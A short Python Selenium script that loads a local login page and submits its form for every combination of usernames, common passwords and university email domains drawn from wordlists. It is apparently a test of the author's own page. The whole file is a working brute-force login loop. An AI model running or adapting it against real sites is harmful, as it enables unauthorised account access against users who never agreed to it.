from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
from pathlib import Path

driver = webdriver.Chrome()
html_file = Path.cwd() / "index.html"
driver.get(html_file.as_uri())

# Populating list full of all generated userNames
userNameFile = open('wordlist\\usernames.txt', 'r')
userNameList = userNameFile.readlines()
userNameFile.close()

# Populating list of common passwords found from the web
passwordsFile = open('wordlist\\passwords.txt', 'r')
passwordsList = passwordsFile.readlines()
passwordsFile.close()

# Populating list of university student email domains
emailFile = open('wordlist\\emails.txt', 'r')
emailList = emailFile.readlines()
emailFile.close()

# This for loop will submit the form on the website using each password with
#  each username with each email we have provided.
for domain in emailList:
  for name in userNameList:
    for passWord in passwordsList:
      # Fills out the login page
      emailField = driver.find_element(By.ID, "loginPageEmailInput")
      emailField.send_keys(Keys.CONTROL + 'a', Keys.BACKSPACE)
      emailField.send_keys(name + domain)

      passField = driver.find_element(By.ID, "loginPagePasswordInput")
      passField.send_keys(Keys.CONTROL + 'a', Keys.BACKSPACE)
      passField.send_keys(passWord)

      loginSubmit = driver.find_element(By.ID, "loginPageLoginBtn").click()

# This time sleep acts as a buffer, allowing you to look at the console.
time.sleep(5.0)

driver.quit()